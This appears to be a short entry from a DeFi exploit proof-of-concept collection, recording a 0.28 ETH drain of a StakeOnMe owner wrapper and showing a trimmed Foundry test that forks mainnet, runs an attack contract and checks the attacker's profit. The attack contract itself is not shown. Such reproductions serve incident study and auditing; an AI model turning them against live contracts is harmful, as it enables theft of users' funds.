# [?] StakeOnMe - Owner-privileged JAKE burn reserve drain

## Summary
Severity: Unknown
Chain: Ethereum
Component: unverified_237d
Published: 2026-03-15
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/unverified_237d_exp.sol
Type: defi-exploit-poc

## Details
Lost: 0.28 ETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 24_664_322;
        vm.createSelectFork("mainnet", forkBlock);
        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(STAKEONME_OWNER_WRAPPER, "StakeOnMe JAKE Owner Wrapper");
        vm.label(JAKE_METOKEN, "JAKE meToken");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        assertEq(IERC20(JAKE_METOKEN).owner(), STAKEONME_OWNER_WRAPPER, "unexpected JAKE owner");

        StakeOnMeAttack attack = new StakeOnMeAttack(ATTACKER);
        vm.label(address(attack), "Local Attack Contract");

        uint256 attackerEthBefore = ATTACKER.balance;
        uint256 wrapperPoolBefore = IStakeOnMeOwnerWrapper(STAKEONME_OWNER_WRAPPER).poolBalance();

        attack.run();

        uint256 attackerProfit = ATTACKER.balance - attackerEthBefore;
        uint256 wrapperPoolAfter = IStakeOnMeOwnerWrapper(STAKEONME_OWNER_WRAPPER).poolBalance();

        emit log_named_decimal_uint("Attacker ETH profit", attackerProfit, 18);
        emit log_named_decimal_uint("Wrapper pool balance before", wrapperPoolBefore, 18);
        emit log_named_decimal_uint("Wrapper pool balance after", wrapperPoolAfter, 18);

        assertGt(attackerProfit, 0.27 ether, "ETH profit below traced impact");
        assertLt(wrapperPoolAfter, wrapperPoolBefore, "wrapper pool balance did not decrease");
        assertEq(IERC20(WETH_TOKEN).balanceOf(address(attack)), 0, "WETH left on helper");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/unverified_237d_exp.sol_
